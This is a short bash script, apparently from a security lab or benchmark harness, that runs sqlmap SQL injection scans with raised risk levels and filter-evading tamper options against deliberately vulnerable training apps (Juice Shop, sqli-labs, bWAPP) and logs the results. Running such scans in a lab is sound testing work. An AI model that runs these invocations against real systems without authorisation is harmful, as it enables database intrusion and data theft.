#!/usr/bin/env bash
set -euo pipefail

cd /workspace

mkdir -p results/live/toolbox

echo "[toolbox] sqlmap version"
sqlmap --version | tee results/live/toolbox/sqlmap_version.txt

echo "[toolbox] Juice Shop search endpoint"
sqlmap -u "http://juiceshop:3000/rest/products/search?q=test" \
  --dbms=sqlite --level=3 --risk=2 --batch --timeout=20 -p q \
  2>&1 | tee results/live/toolbox/sqlmap_juiceshop.txt

echo "[toolbox] sqli-labs Less-1"
sqlmap -u "http://sqli-labs/Less-1/?id=1" \
  --dbms=mysql --level=5 --risk=3 --batch --timeout=30 -p id \
  --tamper=space2comment,charencode \
  2>&1 | tee results/live/toolbox/sqlmap_less1.txt

echo "[toolbox] bWAPP"
sqlmap -u "http://bwapp/sqli_1.php?title=test&action=search" \
  --dbms=mysql --level=3 --risk=2 --batch --timeout=20 -p title \
  2>&1 | tee results/live/toolbox/sqlmap_bwapp.txt